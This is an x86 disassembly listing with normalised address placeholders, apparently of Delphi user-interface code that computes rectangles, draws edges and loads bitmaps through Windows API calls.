push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
sub eax [ ebp - 0x50 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx [ ebp + 0x8 ]
sub eax [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
sub [ edx - 0x28 ] eax
mov edx [ ebp + 0x8 ]
sub eax [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x20 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
push eax
lea eax [ ebp - 0x58 ]
push eax
call OffsetRect
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_3a656c8
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x1
push 0xe
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp [ eax + 0x40 ] 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax ebx
xor al 0x1
test al al
je r-xdata
push 0x0
push edi
push 0x2
push 0xe
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abee18
mov edx [ esi ]
cmp eax [ edx + 0x40 ]
jg r-xdata
mov eax [ esi ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x40 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x28 ]
sub [ edi + 0x8 ] eax
mov eax [ ebp - 0x40 ]
mov [ edi ] eax
mov eax [ ebp - 0x28 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov al 0x1
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_3a656c8
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_3a656c8
je r-xdata
push 0x10
lea eax [ ebp - 0x68 ]
push eax
mov ecx 0x10
xor edx edx
xor eax eax
call sub_3a78e1c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x24 ]
sub edx 0x10
sar edx 0x1
jns r-xdata
mov eax [ esi ]
cmp [ eax + 0x40 ] 0xffffffff
jle r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0x28 ]
sub [ edi + 0x8 ] eax
mov eax [ ebp - 0x28 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x28 ]
sub [ edi + 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x28 ]
add [ edi ] eax
jmp r-xdata
test bl bl
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp - 0x10 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub [ edi + 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edx [ ecx - 0x24 ]
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
sub edx eax
sub edx 0x10
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abee18
mov edx [ esi ]
cmp eax [ edx + 0x40 ]
jle r-xdata
mov eax [ ebp - 0x48 ]
dec eax
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x40 ]
inc eax
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi edi
lea edi [ eax - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
push edi
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ esi ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ esi ]
call sub_3aa3e34
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov ecx [ ebp + 0x8 ]
add edx eax
push edx
lea eax [ ebp - 0x68 ]
push eax
call OffsetRect
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x58 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x39 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0xc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x0
lea eax [ ebp - 0x58 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x3d ]
mov edx [ esi ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x24 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x2c ]
sub edx [ ecx + 0x30 ]
sar edx 0x1
jns r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x1c ]
sub [ edi + 0xc ] eax
push 0x0
push edi
push 0x0
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call sub_3abdd24
mov dl 0x7
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x44 ]
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
mov [ edi + 0x8 ] eax
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x68 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov ecx [ ebp + 0x8 ]
add edx [ ecx - 0x24 ]
push edx
mov edx [ esi ]
mov edx [ edx + 0x40 ]
push edx
mov edx [ esi ]
movzx edx [ edx + 0x39 ]
push edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
sub ecx eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub ecx [ edx + 0x34 ]
sar ecx 0x1
jns r-xdata
adc edx 0x0
push eax
push 0x0
push edi
call OffsetRect
push edi
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ esi ]
call sub_3aa3e34
mov eax [ esi ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ esi ]
mov ecx [ eax + 0x4c ]
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a050
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x5c ]
sub edx [ ebp - 0x64 ]
sub edx eax
sar edx 0x1
jns r-xdata
add [ ebp - 0x68 ] edx
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
add eax [ ebp - 0x68 ]
mov [ ebp - 0x60 ] eax
adc edx 0x0
mov edx [ ebp + 0x8 ]
add ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abf108
jmp r-xdata
adc ecx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aa494a
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
add [ ebp - 0x64 ] edx
mov eax [ esi ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
adc edx 0x0
mov eax [ esi ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
movzx eax [ eax + 0x60 ]
call sub_3aa2bd4
test bl bl
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx eax
add edx eax
add edx [ ebp - 0x28 ]
add edx [ ebp - 0x24 ]
mov [ edi ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_3a8a19c
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax [ edi + 0x8 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
sub eax [ ebp - 0x10 ]
sub eax [ ebp - 0x28 ]
mov [ edi + 0x8 ] eax
jmp r-xdata
push edi
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
call sub_3aa3bd8
jmp r-xdata
sub_3aa4960
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_3aa52ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_3a89b20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_3a89b20
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x24 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_3a656c8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_3a89220
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_3a89b20
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x28 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x1c ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abee18
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffd8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a340
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x28 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x28 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_3a89b18
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_3a89b20
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x24 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x28 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov edx [ ebp + 0x8 ]
mov [ edx - 0x54 ] eax
xor eax eax
push ebp
push sub_3aa4df0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_3a8f384
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_3a89220
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0x24 ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_3abee18
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_3a89b20
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_3a89b18
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_3a90704
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_3a89af4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x56 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a89f04
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3a8a050
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x48 ]
lea edi [ edx - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x24 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x28 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x28 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
